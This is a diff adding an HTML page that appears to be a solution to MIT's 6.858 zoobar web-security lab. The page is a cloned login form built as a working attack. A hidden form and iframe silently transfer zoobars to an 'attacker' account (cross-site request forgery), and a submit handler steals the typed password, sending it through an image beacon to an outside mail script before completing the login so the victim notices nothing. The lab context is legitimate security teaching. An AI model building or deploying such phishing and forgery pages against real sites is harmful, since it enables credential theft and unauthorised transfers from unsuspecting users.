@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+
+<base target="_self" href="http://localhost:8080/zoobar/index.cgi/transfer">
+
+<html>
+    <head>
+        <meta charset="utf-8">
+        <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
+        <title>
+          Login - Zoobar Foundation
+        </title>
+    </head>
+    <body>
+
+      <h1><a href="http://localhost:8080/zoobar/index.cgi/">Zoobar Foundation for Disciplined
+                      Research</a></h1>
+      <h2>Supporting the loyal
+          representatives of the next generation</h2>
+
+<div id="login" class="centerpiece">
+
+<form name="loginform" method="POST" id="form" action="http://localhost:8080/zoobar/index.cgi/login">
+<table>
+<tr>
+   <td>Username:</td>
+  <td><input type="text" name="login_username" size="20"
+  autocomplete="no" value=""></td>
+</tr>
+<tr>
+   <td>Password:</td>
+  <td colspan=2><input id="pass" type="password" name="login_password" size=20 autocomplete="no">
+  <input type="submit" id="log" name="submit_login" value="Log in">
+  <input type="submit" id="register" name="submit_registration" value="Register"></td>
+</tr>
+</table>
+<input type="hidden" name="nexturl" value="/zoobar/index.cgi/">
+</form>
+</div>
+<div class="footer warning">
+
+
+</div>
+
+<iframe name="frame" id="transfer" src="_self" style="visibility:hidden;height=0;width=0;"> </iframe>
+
+<form target="frame" method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer">
+<p hidden>Send <input name="zoobars" type="text" value="10"  size=5> zoobars</p>
+<p hidden>to <input name=recipient type=text value="attacker" size=10></p>
+<input type="submit" name="submission" value="Send" style="visibility:hidden;">
+</form>
+
+
+
+<script>document.loginform.login_username.focus();</script>
+
+<script type="text/javascript" src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
+
+<script type="text/javascript">
+function fun() {
+  window.location.replace("http://css.csail.mit.edu/6.858/2015/");
+}
+
+if (myZoobars) {
+  var g = document.getElementById("transfer");
+  g.addEventListener("load", fun, false);
+  document.forms[1].submit();
+}
+</script>
+
+<script type="text/javascript">
+var reg = false;
+
+document.getElementById("form").addEventListener("submit", function(event){
+submit(event)});
+
+document.getElementById("register").addEventListener("click", function(event){
+reg = true;});
+
+var loop = 0;
+
+
+function submit(event) {
+  
+  if (loop == 0) {
+    event.preventDefault();
+    var pass = document.getElementById("pass").value;
+    javascript:void((new Image()).src='http://css.csail.mit.edu/6.858/2015/labs/sendmail.php?' + 'to=markatou@mit.edu' + '&payload=' + pass);
+    loop =1;
+    setTimeout(function(){
+        if (reg==true) {
+            document.getElementById("register").click();
+        } else {
+            document.getElementById("log").click();
+        }
+    }, 10000);
+  }
+}
+
+</script>
+
+
+    </body>
+</html>
+
+
